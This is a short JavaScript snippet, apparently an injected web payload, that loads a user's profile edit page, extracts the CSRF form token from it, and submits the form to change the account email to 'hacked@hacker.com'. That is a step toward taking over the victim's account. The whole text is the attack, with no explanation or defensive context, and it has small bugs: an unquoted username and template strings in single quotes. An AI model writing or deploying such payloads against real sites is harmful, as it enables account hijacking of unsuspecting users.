
var csrfToken;
var username = omargad92;
fetch('/users/${username}/edit')
  .then(r => r.text())
  .then(d => {
    csrfToken = (new DOMParser().parseFromString(d, 'text/html').querySelector('[id="edit-user-personal-info-form-form-token"]') || {}).value;
            
        const email = 'hacked@hacker.com';
        const op = 'Save';
        const formData = new FormData();
        formData.append('mail', email);
        formData.append('op', op);
        formData.append('form_token', csrfToken);
        formData.append('form_id', 'user_personal_info_form');
        fetch('/users/${username}/edit', {
        method: 'POST',
        body: formData,
        })
        .then(response => response.text())
        .then(data => console.log('Response:', data))
        })
